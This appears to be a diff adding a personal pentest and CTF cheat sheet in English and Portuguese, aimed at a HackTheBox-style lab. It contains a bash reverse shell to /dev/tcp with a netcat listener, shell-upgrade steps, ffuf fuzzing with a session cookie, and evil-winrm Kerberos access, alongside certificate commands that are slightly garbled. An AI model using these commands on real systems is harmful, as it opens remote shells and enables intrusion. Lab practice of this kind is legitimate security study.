@@ -1,0 +1,87 @@
+#### Basic rev shell
+```bash
+# On guest
+$ bash -c 'bash -i >& /dev/tcp/10.10.14.6/4545 0>&1'
+
+# On host
+nc -nv 10.10.14.6 4545
+```
+#### Upgrade a rev shell
+```sh
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+# ou
+$ /usr/bin/script -qc /bin/bash /dev/null
+^Z
+
+$ stty raw -echo; fg
+$ stty rows 50 columns 200
+$ export TERM=linux
+$ exec /bin/bash
+```
+#### Fuff ID enumeration
+```sh
+$ ffuf -u 'http://172.16.11.37/note.php?id=FUZZ' -b 'PHPSESSID=hurcb449m5j5sl7o49d2hu5nk9' -w <(seq 1 107)
+```
+#### Mount a image on Linux
+```sh
+$ sudo mkdir /mnt/mountpoint
+$ sudo mount -o loop ./chal_tiny_usb.iso /mnt/mountpoint
+```
+#### Certificado auto assinado
+```sh
+$ vim /etc/ssl/openssl.cnf
+[ wsc.local ]
+subjectAltName = DNS:www.wsc.local
+
+$ openssl genrsa -aes128 2048 > server.key 
+$ openssl rsa -in server.key -out server.key 
+
+# Removendo a senha da chave
+$ openssl rsa -in server.key -out server.key
+
+# Criando a requisição(CSR)
+$ openssl req -utf8 -new -key server.key -out server.csr
+
+# Assinando o certificado
+$ openssl x509 -in server.csr -out server.crt -req -signkey server.key -extfile /etc/ssl/openssl.cnf -extensions srv.world -days 3650
+```
+#### Testa se uma chave pertence ao certificado
+```sh
+$ openssl x509 -noout -modulus -in /etc/ssl/ldap/ldap.crt | openssl md5 openssl rsa -noout -modulus -in /etc/ssl/ldap/ldap.key | openssl md5
+```
+
+#### Parar sincronização de horário e sincronizar manualmente
+```sh
+# Parar serviço de tempo temporariamente
+sudo systemctl stop systemd-timesyncd
+
+# Forçar sincronização com o DC
+sudo ntpdate -b voleur.htb
+```
+
+#### Kerberos
+```sh
+# Definir o realm e KDC via variáveis de ambiente
+export KRB5_REALM=VOLEUR.HTB
+export KRB5_KDC=dc.voleur.htb
+
+# Especificar o cache do ticket
+export KRB5CCNAME=$(pwd)/svc_winrm.ccache
+
+# Tentar novamente com evil-winrm
+evil-winrm -i dc.voleur.htb -u 'svc_winrm' -k -r 'voleur.htb'
+```
+openssl s_client -showcerts -connect 10.0.10.10:443
+
+#### 
+
+#### ver chave publica
+```sh
+ssh-keygen -y -f ./id_rsa
+```
+
+
+
+
+
+
